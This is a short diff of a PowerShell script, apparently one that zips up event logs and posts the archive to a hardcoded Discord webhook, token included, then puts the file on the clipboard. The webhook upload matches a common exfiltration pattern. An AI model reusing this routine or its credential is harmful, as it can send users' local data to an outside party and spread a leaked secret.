@@ -202,7 +202,8 @@ function compression {
 function eof {
 
 $webhookUrl = "https://discord.com/api/webhooks/1270073075253383243/2G1bFxjomf4iI-t1RiKm23FZY30w-LQG4rhAX-r35ga0imSO10zGJSMEEwfb_BTeXLWc"
-$filePath = "C:\Users\typic\Downloads\eventlogs_9737.zip"
+
+$filePath = "$ziptar"
 Add-Type -AssemblyName 'System.Net.Http'
 $httpClient = [System.Net.Http.HttpClient]::new()
 $multipartFormDataContent = [System.Net.Http.MultipartFormDataContent]::new()
@@ -213,6 +214,7 @@ $multipartFormDataContent.Add($fileContent, "file", [System.IO.Path]::GetFileNam
 $response = $httpClient.PostAsync($webhookUrl, $multipartFormDataContent).Result
 $fileStream.Dispose()
 $httpClient.Dispose()
+
 
     Add-Type -AssemblyName System.Windows.Forms
     [System.Windows.Forms.Clipboard]::SetFileDropList([System.Collections.Specialized.StringCollection]@($ziptar))
